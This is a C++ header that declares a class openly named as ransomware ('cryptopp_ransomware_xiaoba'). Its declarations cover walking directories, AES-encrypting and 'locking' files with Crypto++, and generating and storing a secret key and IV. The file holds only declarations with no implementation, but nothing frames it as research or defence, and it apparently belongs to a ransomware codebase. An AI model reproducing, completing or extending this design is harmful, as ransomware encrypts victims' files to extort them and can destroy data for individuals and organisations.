#pragma once
#include <dirent.h>
#include <string.h>
#include <Windows.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/aes.h>
#include <iostream>
#include <stdlib.h>
#include <cstring>
using namespace CryptoPP;
using namespace std;


class cryptopp_ransomware_xiaoba
{
public:
	int listfiledirectory(char*);
	int is_directory(char*);
	int open_file(char*);
	int nb_file = 0;
	byte* generate_iv(void);
	byte* generate_key(void);
	byte* encrypt(byte*, byte*, int, byte*, int);
	byte* decrypt(byte*, byte*, int, byte*, int);
	byte* charinputencrypt(char*);
	byte* get_secret_key(void);
	byte* get_secret_iv(void);
	byte* secret_key;
	byte* secret_iv;
	int encrypt_file(char*, const char*);
	std::string number_to_string(int);
	int lock_file(char*);

	std::string cipher;
	char* slash = (char*)"\\\\";
};

